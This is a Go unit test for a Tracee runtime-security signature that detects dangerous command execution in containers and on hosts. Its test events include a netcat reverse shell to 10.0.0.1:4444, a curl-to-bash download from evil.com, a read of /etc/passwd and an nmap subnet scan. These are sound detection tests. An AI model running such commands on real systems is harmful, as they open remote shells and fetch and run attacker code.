package main

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/aquasecurity/tracee/signatures/signaturestest"
	"github.com/aquasecurity/tracee/types/detect"
	"github.com/aquasecurity/tracee/types/trace"
)

func TestDangerousCommandExecution(t *testing.T) {
	t.Parallel()

	sigMetadata := detect.SignatureMetadata{
		ID:          "TRC-CUSTOM-001",
		Version:     "1",
		Name:        "Dangerous Command Execution",
		EventName:   "dangerous_command_execution",
		Description: "A potentially dangerous command was executed. In container environments, reconnaissance commands like whoami, id, and hostname indicate possible compromise since these are rarely needed in production containers. Reverse shell patterns are flagged in all environments.",
		Properties: map[string]interface{}{
			"Severity":             2,
			"Category":             "execution",
			"Technique":            "Command and Scripting Interpreter",
			"Kubernetes_Technique": "",
			"id":                   "attack-pattern--7385dfbe-b6d7-4f2e-a1ab-28c9e67e3ef2",
			"external_id":          "T1059",
		},
	}

	testCases := []struct {
		Name     string
		Events   []trace.Event
		Findings map[string]*detect.Finding
	}{
		{
			Name: "should trigger detection - whoami in container",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "whoami",
					Container: trace.Container{
						ID: "abc123def456",
					},
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"whoami"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{
				"TRC-CUSTOM-001": {
					Data: map[string]interface{}{
						"context": "container",
					},
					Event: trace.Event{
						EventName:   "sched_process_exec",
						ProcessName: "whoami",
						Container: trace.Container{
							ID: "abc123def456",
						},
						Args: []trace.Argument{
							{
								ArgMeta: trace.ArgMeta{
									Name: "argv",
								},
								Value: interface{}([]string{"whoami"}),
							},
						},
					}.ToProtocol(),
					SigMetadata: sigMetadata,
				},
			},
		},
		{
			Name: "should not trigger detection - whoami on host",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "whoami",
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"whoami"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{},
		},
		{
			Name: "should trigger detection - nc reverse shell in container",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "nc",
					Container: trace.Container{
						ID: "abc123def456",
					},
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"nc", "-e", "/bin/bash", "10.0.0.1", "4444"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{
				"TRC-CUSTOM-001": {
					Data: map[string]interface{}{
						"context": "container",
					},
					Event: trace.Event{
						EventName:   "sched_process_exec",
						ProcessName: "nc",
						Container: trace.Container{
							ID: "abc123def456",
						},
						Args: []trace.Argument{
							{
								ArgMeta: trace.ArgMeta{
									Name: "argv",
								},
								Value: interface{}([]string{"nc", "-e", "/bin/bash", "10.0.0.1", "4444"}),
							},
						},
					}.ToProtocol(),
					SigMetadata: sigMetadata,
				},
			},
		},
		{
			Name: "should trigger detection - nc reverse shell on host",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "nc",
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"nc", "-e", "/bin/bash", "10.0.0.1", "4444"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{
				"TRC-CUSTOM-001": {
					Data: map[string]interface{}{
						"context": "host",
					},
					Event: trace.Event{
						EventName:   "sched_process_exec",
						ProcessName: "nc",
						Args: []trace.Argument{
							{
								ArgMeta: trace.ArgMeta{
									Name: "argv",
								},
								Value: interface{}([]string{"nc", "-e", "/bin/bash", "10.0.0.1", "4444"}),
							},
						},
					}.ToProtocol(),
					SigMetadata: sigMetadata,
				},
			},
		},
		{
			Name: "should not trigger detection - ls in container",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "ls",
					Container: trace.Container{
						ID: "abc123def456",
					},
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"ls", "-la"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{},
		},
		{
			Name: "should not trigger detection - nmap on host",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "nmap",
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"nmap", "-sV", "192.168.1.0/24"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{},
		},
		{
			Name: "should trigger detection - nmap in container",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "nmap",
					Container: trace.Container{
						ID: "abc123def456",
					},
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"nmap", "-sV", "192.168.1.0/24"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{
				"TRC-CUSTOM-001": {
					Data: map[string]interface{}{
						"context": "container",
					},
					Event: trace.Event{
						EventName:   "sched_process_exec",
						ProcessName: "nmap",
						Container: trace.Container{
							ID: "abc123def456",
						},
						Args: []trace.Argument{
							{
								ArgMeta: trace.ArgMeta{
									Name: "argv",
								},
								Value: interface{}([]string{"nmap", "-sV", "192.168.1.0/24"}),
							},
						},
					}.ToProtocol(),
					SigMetadata: sigMetadata,
				},
			},
		},
		{
			Name: "should trigger detection - cat /etc/passwd in container",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "cat",
					Container: trace.Container{
						ID: "abc123def456",
					},
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"cat", "/etc/passwd"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{
				"TRC-CUSTOM-001": {
					Data: map[string]interface{}{
						"context": "container",
					},
					Event: trace.Event{
						EventName:   "sched_process_exec",
						ProcessName: "cat",
						Container: trace.Container{
							ID: "abc123def456",
						},
						Args: []trace.Argument{
							{
								ArgMeta: trace.ArgMeta{
									Name: "argv",
								},
								Value: interface{}([]string{"cat", "/etc/passwd"}),
							},
						},
					}.ToProtocol(),
					SigMetadata: sigMetadata,
				},
			},
		},
		{
			Name: "should trigger detection - curl pipe to bash on host",
			Events: []trace.Event{
				{
					EventName:   "sched_process_exec",
					ProcessName: "curl",
					Args: []trace.Argument{
						{
							ArgMeta: trace.ArgMeta{
								Name: "argv",
							},
							Value: interface{}([]string{"curl", "http://evil.com/payload.sh", "|bash"}),
						},
					},
				},
			},
			Findings: map[string]*detect.Finding{
				"TRC-CUSTOM-001": {
					Data: map[string]interface{}{
						"context": "host",
					},
					Event: trace.Event{
						EventName:   "sched_process_exec",
						ProcessName: "curl",
						Args: []trace.Argument{
							{
								ArgMeta: trace.ArgMeta{
									Name: "argv",
								},
								Value: interface{}([]string{"curl", "http://evil.com/payload.sh", "|bash"}),
							},
						},
					}.ToProtocol(),
					SigMetadata: sigMetadata,
				},
			},
		},
	}

	for _, tc := range testCases {
		tc := tc

		t.Run(tc.Name, func(t *testing.T) {
			t.Parallel()

			holder := signaturestest.FindingsHolder{}
			sig := DangerousCommandExecution{}
			sig.Init(detect.SignatureContext{Callback: holder.OnFinding})

			for _, e := range tc.Events {
				err := sig.OnEvent(e.ToProtocol())
				require.NoError(t, err)
			}
			assert.Equal(t, tc.Findings, holder.GroupBySigID())
		})
	}
}
